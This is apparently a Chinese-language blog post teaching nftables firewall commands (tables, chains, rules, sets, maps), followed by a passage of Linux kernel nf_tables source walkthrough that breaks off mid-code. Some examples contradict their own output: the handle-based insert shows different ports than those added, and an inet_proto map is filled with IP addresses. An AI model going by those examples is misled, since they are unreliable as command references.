href="#nftables使用" class="headerlink" title="nftables使用"></a>nftables使用</h2><h3 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add table inet my_table</span><br></code></pre></td></tr></table></figure><p>一个表一个地址簇</p><table><thead><tr><th>nftables簇</th><th>iptables命令行工具</th></tr></thead><tbody><tr><td>ip</td><td>iptables</td></tr><tr><td>ip6</td><td>ip6tables</td></tr><tr><td>inet</td><td>iptables和ip6tables</td></tr><tr><td>arp</td><td>arptables</td></tr><tr><td>bridge</td><td>ebtables</td></tr></tbody></table><p>列出所有规则</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list ruleset</span><br>table inet my_table &#123;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="创建链"><a href="#创建链" class="headerlink" title="创建链"></a>创建链</h3><p>两种链</p><ul><li><p><strong>常规链</strong>：不需要指定钩子类型和优先级，可以用来做跳转，从逻辑上对规则进行分类</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add chain inet my_table my_utility_chain</span><br></code></pre></td></tr></table></figure></li><li><p><strong>基本链</strong>：数据包的入口点，需要指定钩子类型和优先级</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add chain inet my_table my_filter_chain &#123; <span class="hljs-built_in">type</span> filter hook input priority 0 \; &#125;</span><br></code></pre></td></tr></table></figure></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list chain inet my_table my_utility_chain</span><br>table inet my_table &#123;<br>        chain my_utility_chain &#123;<br>        &#125;<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list chain inet my_table my_filter_chain</span><br>table inet my_table &#123;<br>        chain my_filter_chain &#123;<br>                type filter hook input priority 0; policy accept;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="创建规则"><a href="#创建规则" class="headerlink" title="创建规则"></a>创建规则</h3><ul><li><p><strong>add</strong>：规则添加到链末尾</p></li><li><p><strong>insert</strong>：规则添加到链头</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add rule inet my_table my_filter_chain tcp dport ssh accept</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft insert rule inet my_table my_filter_chain tcp dport http accept</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list ruleset</span><br>table inet my_table &#123;<br>        chain my_filter_chain &#123;<br>                type filter hook input priority 0; policy accept;<br>                tcp dport http accept<br>                tcp dport ssh accept<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>index</strong>：指定规则index</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft insert rule inet my_table my_filter_chain index 1 tcp dport nfs accept</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list ruleset</span><br>table inet my_table &#123;<br>     chain my_filter_chain &#123;<br>             type filter hook input priority 0; policy accept;<br>             tcp dport http accept<br>             tcp dport nfs accept<br>             tcp dport ssh accept<br>     &#125;<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add rule inet my_table my_filter_chain index 0 tcp dport 1234 accept</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list ruleset</span><br>table inet my_table &#123;<br>     chain my_filter_chain &#123;<br>             type filter hook input priority 0; policy accept;<br>             tcp dport http accept<br>             tcp dport 1234 accept<br>             tcp dport nfs accept<br>             tcp dport ssh accept<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>handle</strong>：指定规则句柄</p><ul><li><strong>add</strong> 表示新规则添加在索引位置的规则后面</li><li><strong>insert</strong> 表示新规则添加在索引位置的规则前面</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft --handle list ruleset</span><br>table inet my_table &#123; # handle 10<br>     chain my_filter_chain &#123; # handle 2<br>             type filter hook input priority 0; policy accept;<br>             tcp dport http accept # handle 4<br>             tcp dport 1234 accept # handle 6<br>             tcp dport nfs accept # handle 5<br>             tcp dport ssh accept # handle 3<br>     &#125;<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add rule inet my_table my_filter_chain handle 4 tcp dport 1234 accept</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft insert rule inet my_table my_filter_chain handle 5 tcp dport nfs accept</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft --handle list ruleset</span><br>table inet my_table &#123; # handle 10<br>     chain my_filter_chain &#123; # handle 2<br>             type filter hook input priority 0; policy accept;<br>             tcp dport http accept # handle 4<br>             tcp dport 2345 accept # handle 8<br>             tcp dport 1234 accept # handle 6<br>             tcp dport 3456 accept # handle 9<br>             tcp dport nfs accept # handle 5<br>             tcp dport ssh accept # handle 3<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="删除规则"><a href="#删除规则" class="headerlink" title="删除规则"></a>删除规则</h3><p>通过handle删除</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft --handle list ruleset</span><br>table inet my_table &#123; # handle 10<br>        chain my_filter_chain &#123; # handle 2<br>                type filter hook input priority 0; policy accept;<br>                tcp dport http accept # handle 4<br>                tcp dport 2345 accept # handle 8<br>                tcp dport 1234 accept # handle 6<br>                tcp dport 3456 accept # handle 9<br>                tcp dport nfs accept # handle 5<br>                tcp dport ssh accept # handle 3<br>                udp dport 3333 accept # handle 10<br>        &#125;<br>&#125;<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft delete rule inet my_table my_filter_chain handle 8</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft --handle list ruleset</span><br>table inet my_table &#123; # handle 10<br>        chain my_filter_chain &#123; # handle 2<br>                type filter hook input priority 0; policy accept;<br>                tcp dport http accept # handle 4<br>                tcp dport 1234 accept # handle 6<br>                tcp dport 3456 accept # handle 9<br>                tcp dport nfs accept # handle 5<br>                tcp dport ssh accept # handle 3<br>                udp dport 3333 accept # handle 10<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="列出规则"><a href="#列出规则" class="headerlink" title="列出规则"></a>列出规则</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list table inet my_table <span class="hljs-comment"># 列出表中规则</span></span><br>table inet my_table &#123;<br>        chain my_filter_chain &#123;<br>                type filter hook input priority 0; policy accept;<br>                tcp dport http accept<br>                tcp dport 1234 accept<br>                tcp dport 3456 accept<br>                tcp dport nfs accept<br>                tcp dport ssh accept<br>                udp dport 3333 accept<br>        &#125;<br>&#125;<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list chain inet my_table my_other_chain <span class="hljs-comment"># 列出链中规则</span></span><br>table inet my_table &#123;<br>    chain my_other_chain &#123;<br>        udp dport 12345 log prefix &quot;UDP-12345&quot;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h3><ul><li><p><strong>匿名集合</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add rule inet my_table my_filter_chain ip saddr &#123; 10.10.10.123, 10.10.10.231 &#125; accept</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list ruleset</span><br>table inet my_table &#123;<br>        chain my_filter_chain &#123;<br>                type filter hook input priority 0; policy accept;<br>                tcp dport http accept<br>                tcp dport nfs accept<br>                tcp dport ssh accept<br>                ip saddr &#123; 10.10.10.123, 10.10.10.231 &#125; accept<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>命名集合</strong></p><p>支持的数据类型</p><ul><li>ipv4_addr：IPv4 地址</li><li>ipv6_addr：IPv6 地址</li><li>ether_addr：以太网（Ethernet）地址</li><li>inet_proto：网络协议</li><li>inet_service：网络服务</li><li>mark：标记类型</li></ul><p>创建空的命名集合</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add <span class="hljs-built_in">set</span> inet my_table my_set &#123; <span class="hljs-built_in">type</span> ipv4_addr \; &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list sets</span><br>table inet my_table &#123;<br>        set my_set &#123;<br>                type ipv4_addr<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>向集合中添加元素</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add element inet my_table my_set &#123; 10.10.10.22, 10.10.10.33 &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list <span class="hljs-built_in">set</span> inet my_table my_set</span><br>table inet my_table &#123;<br>        set my_set &#123;<br>                type ipv4_addr<br>                elements = &#123; 10.10.10.22, 10.10.10.33 &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>引用集合</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft insert rule inet my_table my_filter_chain ip saddr @my_set drop</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list chain inet my_table my_filter_chain</span><br>table inet my_table &#123;<br>        chain my_filter_chain &#123;<br>                type filter hook input priority 0; policy accept;<br>                ip saddr @my_set drop<br>                tcp dport http accept<br>                tcp dport nfs accept<br>                tcp dport ssh accept<br>                ip saddr &#123; 10.10.10.123, 10.10.10.231 &#125; accept<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>支持区间</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add <span class="hljs-built_in">set</span> inet my_table my_range_set &#123; <span class="hljs-built_in">type</span> ipv4_addr \; flags interval</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add element inet my_table my_range_set &#123; 10.20.20.0/24 &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list <span class="hljs-built_in">set</span> inet my_table my_range_set</span><br>table inet my_table &#123;<br>        set my_range_set &#123;<br>                type ipv4_addr<br>                flags interval<br>                elements = &#123; 10.20.20.0/24 &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>级联不同类型</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add <span class="hljs-built_in">set</span> inet my_table my_concat_set  &#123; <span class="hljs-built_in">type</span> ipv4_addr . inet_proto . inet_service \; &#125;</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list <span class="hljs-built_in">set</span> inet my_table my_concat_set</span><br>table inet my_table &#123;<br>        set my_concat_set &#123;<br>                type ipv4_addr . inet_proto . inet_service<br>        &#125;<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add element inet my_table my_concat_set &#123; 10.30.30.30 . tcp . telnet &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add rule inet my_table my_filter_chain ip saddr . meta l4proto . tcp dport @my_concat_set accept</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add rule inet my_table my_filter_chain ip saddr . meta l4proto . udp dport &#123; 10.30.30.30 . udp . bootps &#125; accept</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add chain inet my_table my_tcp_chain</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add chain inet my_table my_udp_chain</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add rule inet my_table my_filter_chain meta l4proto vmap &#123; tcp : jump my_tcp_chain, udp : jump my_udp_chain &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list chain inet my_table my_filter_chain</span><br>table inet my_table &#123;<br>    chain my_filter_chain &#123;<br>    ...<br>    meta nfproto ipv4 ip saddr . meta l4proto . udp dport &#123; 10.30.30.30 . udp . bootps &#125; accept<br>    meta l4proto vmap &#123; tcp : jump my_tcp_chain, udp : jump my_udp_chain &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add map inet my_table my_vmap &#123; <span class="hljs-built_in">type</span> inet_proto : verdict \; &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add element inet my_table my_vmap &#123; 192.168.0.10 : drop, 192.168.0.11 : accept &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add rule inet my_table my_filter_chain ip saddr vmap @my_vmap</span><br></code></pre></td></tr></table></figure><h2 id="nftables相关源码"><a href="#nftables相关源码" class="headerlink" title="nftables相关源码"></a>nftables相关源码</h2><p>nftables也有对应模块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">module_init(nf_tables_module_init);<br>module_exit(nf_tables_module_exit);<br></code></pre></td></tr></table></figure><p>nf_tables_module_init函数调用关系图</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/function2.png" class title="function2"><p>相关变量</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/struct.png" class title="struct"><h3 id="用户态和内核态的消息传递-1"><a href="#用户态和内核态的消息传递-1" class="headerlink" title="用户态和内核态的消息传递"></a>用户态和内核态的消息传递</h3><p>内核态和用户态通过 <strong>Netlink</strong> 交互</p><blockquote><p>Netlink是一个内核接口，也是一种协议，便于用户与内核进行网络信息交互，最初开发是为了克服ioctl的限制</p></blockquote><p>使用sendto向内核传递消息时的函数调用栈</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/stack.png" class title="stack"><p> <strong>nfnetlink_rcv_batch</strong> 利用 <strong>subsys_id</strong> 获取nftables的 <strong>nfnetlink_subsystem</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nfnetlink_rcv_batch</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb, <span class="hljs-keyword">struct</span> nlmsghdr *nlh,</span><br><span class="hljs-params">u16 subsys_id, u32 genid)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nfnetlink_subsystem</span> *<span class="hljs-title">ss</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nfnl_callback</span> *<span class="hljs-title">nc</span>;</span><br>    <br>    <br>ss = nfnl_dereference_protected(subsys_id);<br>    <br><br>nc = nfnetlink_find_client(type, ss);<br>    <br>    <br>    err = nc-&gt;call(skb, &amp;info, (<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr **)cda);<br>    <br>    <br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nfnl_callback *<br><span class="hljs-title function_">nfnetlink_find_client</span><span class="hljs-params">(u16 type, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nfnetlink_subsystem *ss)</span><br>&#123;<br>u8 cb_id = NFNL_MSG_TYPE(type);<br><br><span class="hljs-keyword">if</span> (cb_id &gt;= ss-&gt;cb_count)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> &amp;ss-&gt;cb[cb_id];<br>&#125;<br></code></pre></td></tr></table></figure><p>nftables的subsys_id是10，对应的nfnetlink_subsystem</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nfnetlink_subsystem</span> <span class="hljs-title">nf_tables_subsys</span> =</span> &#123;<br>.name= <span class="hljs-string">&quot;nf_tables&quot;</span>,<br>.subsys_id= NFNL_SUBSYS_NFTABLES,<br>.cb_count= NFT_MSG_MAX,<br>.cb= nf_tables_cb,<br>.commit= nf_tables_commit,<br>.<span class="hljs-built_in">abort</span>= nf_tables_abort,<br>.cleanup= nf_tables_cleanup,<br>.valid_genid= nf_tables_valid_genid,<br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure><p>nfnl_callback数组，包含了表和链各种数据结构的增删改查函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nfnl_callback</span> <span class="hljs-title">nf_tables_cb</span>[<span class="hljs-title">NFT_MSG_MAX</span>] =</span> &#123;<br>[NFT_MSG_NEWTABLE] = &#123;<br>.call= nf_tables_newtable,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_TABLE_MAX,<br>.policy= nft_table_policy,<br>&#125;,<br>[NFT_MSG_GETTABLE] = &#123;<br>.call= nf_tables_gettable,<br>.type= NFNL_CB_RCU,<br>.attr_count= NFTA_TABLE_MAX,<br>.policy= nft_table_policy,<br>&#125;,<br>[NFT_MSG_DELTABLE] = &#123;<br>.call= nf_tables_deltable,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_TABLE_MAX,<br>.policy= nft_table_policy,<br>&#125;,<br>[NFT_MSG_NEWCHAIN] = &#123;<br>.call= nf_tables_newchain,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_CHAIN_MAX,<br>.policy= nft_chain_policy,<br>&#125;,<br>[NFT_MSG_GETCHAIN] = &#123;<br>.call= nf_tables_getchain,<br>.type= NFNL_CB_RCU,<br>.attr_count= NFTA_CHAIN_MAX,<br>.policy= nft_chain_policy,<br>&#125;,<br>[NFT_MSG_DELCHAIN] = &#123;<br>.call= nf_tables_delchain,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_CHAIN_MAX,<br>.policy= nft_chain_policy,<br>&#125;,<br>[NFT_MSG_NEWRULE] = &#123;<br>.call= nf_tables_newrule,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_RULE_MAX,<br>.policy= nft_rule_policy,<br>&#125;,<br>[NFT_MSG_GETRULE] = &#123;<br>.call= nf_tables_getrule,<br>.type= NFNL_CB_RCU,<br>.attr_count= NFTA_RULE_MAX,<br>.policy= nft_rule_policy,<br>&#125;,<br>[NFT_MSG_DELRULE] = &#123;<br>.call= nf_tables_delrule,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_RULE_MAX,<br>.policy= nft_rule_policy,<br>&#125;,<br>[NFT_MSG_NEWSET] = &#123;<br>.call= nf_tables_newset,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_SET_MAX,<br>.policy= nft_set_policy,<br>&#125;,<br>[NFT_MSG_GETSET] = &#123;<br>.call= nf_tables_getset,<br>.type= NFNL_CB_RCU,<br>.attr_count= NFTA_SET_MAX,<br>.policy= nft_set_policy,<br>&#125;,<br>[NFT_MSG_DELSET] = &#123;<br>.call= nf_tables_delset,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_SET_MAX,<br>.policy= nft_set_policy,<br>&#125;,<br>[NFT_MSG_NEWSETELEM] = &#123;<br>.call= nf_tables_newsetelem,<br>.type= NFNL_CB_BATCH,<br>.attr_count= NFTA_SET_ELEM_LIST_MAX,<br>.policy= nft_set_elem_list_policy,<br>&#125;,<br>[NFT_MSG_GETSETELEM] = &#123;<br>.call= nf_tables_getsetelem,<br>.type= NFNL_CB_RCU,<br>.attr_count= NFTA_SET_ELEM_LIST_MAX,<br>.policy= nft_set_elem_list_policy,<br>&#125;,<br>[NFT_MSG_DELSETELEM] = &#123;<br>.call= nf_tables_delsetelem,<br>.type= NFNL_CB_BATCH,<br>.attr_count= 